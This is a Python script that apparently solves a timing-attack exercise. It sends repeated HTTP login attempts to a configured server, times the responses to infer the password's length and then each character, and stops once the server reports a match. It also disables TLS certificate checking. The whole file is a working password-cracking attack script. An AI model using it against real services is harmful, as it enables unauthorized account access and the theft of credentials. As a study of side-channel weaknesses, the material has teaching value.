from dotenv import load_dotenv
from functools import partial
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import os
import timeit
import numpy
import requests

# start = time.time()
# # --- your code here ---
# do_something()
# end = time.time()

# print(f"Elapsed time: {end - start:.6f} seconds")


session = requests.Session()   # reuse connections!
session.verify = False
session.headers.update({"Connection": "keep-alive"})
from Config import Config, TASK_CONFIG
from CorrectException import CorrectException

def init_environment() -> None:
    """
    Initilizes the configuration so we can access it everywhere.
    """

    load_dotenv()
    global TASK_CONFIG
    TASK_CONFIG = Config(server_ip=os.getenv("SERVER_IP"),
                         username=os.getenv("USERNAME"),
                         difficulty=os.getenv("DIFFICULTY"),
                         format=os.getenv("FORMAT"),
                         retries=int(os.getenv("RETRIES")),
                         password_chars=os.getenv("PASSWORD_CHARS"),
                         max_password_length=int(os.getenv("MAX_PASSWORD_LENGTH")))

def try_password(password: str) -> None:
    """
    :param password: A password to try.
    Return: None, we only care about the time.
    Throws: CorrectException if correct, we want to stop as soon as we hit the correct password
    """

    url = TASK_CONFIG.format.format(TASK_CONFIG.server_ip, TASK_CONFIG.username, password, TASK_CONFIG.difficulty)
    result = session.get(url, timeout=3000).text
    if "1" == result:
        raise CorrectException(password)

def find_length() -> int:
    """
    Uses a timeing attack to find the length of the password.

    Return: The length of the password.
    """

    password = ""
    single_char = TASK_CONFIG.password_chars[0]
    tries = []
    
    for _ in range(TASK_CONFIG.max_password_length):
        password += single_char
        tries.append(time_candidate(password, TASK_CONFIG.retries))
    
    return numpy.argmax(tries) + 1

def time_candidate(candidate: str, repeats: int) -> int:
    total = 0
    for _ in range(repeats):
        t0 = time.perf_counter_ns()
        try_password(candidate)
        total += time.perf_counter_ns() - t0
    return total
def find_next_char(start_password,padding) -> str:
    """
    Finds the next correct char in the password.

    :param start_password: The starting chars of the password.
    Return: The next char in the password.
    """

    tries = dict()
    for char in TASK_CONFIG.password_chars:
        tries[char]=time_candidate(start_password + char + padding, TASK_CONFIG.retries)
        
    return max(tries, key=tries.get)


def _crack() -> None:
    """
    Cracks the password.

    Throws: The correct password
    """
    length = find_length()
    print(length)
    password = ""
    padding = TASK_CONFIG.password_chars[0] * length
    for _ in range(length):
        password += find_next_char(password,padding[0:length-len(password)-1])
        print(password)

def crack() -> str | None:
    """
    Return: password on success or None otherwise.
    """

    try:
        _crack()
        return None
    except CorrectException as password:
        return password.args[0]


def main() -> None:
    init_environment()

    while True:
        password = crack()
        if None != password:
            print(password)
            return

if "__main__" == __name__:
    main()
